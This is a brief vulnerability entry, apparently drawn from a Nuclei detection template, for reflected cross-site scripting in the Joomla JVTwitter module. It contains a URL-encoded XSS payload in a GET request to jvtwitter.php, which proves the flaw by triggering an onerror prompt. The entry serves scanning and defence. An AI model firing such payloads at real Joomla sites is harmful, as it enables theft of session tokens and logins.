# Vulnerability: Joomla JVTwitter - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`joomla-jvtwitter-xss.yaml`)

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
GET {{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id=
```

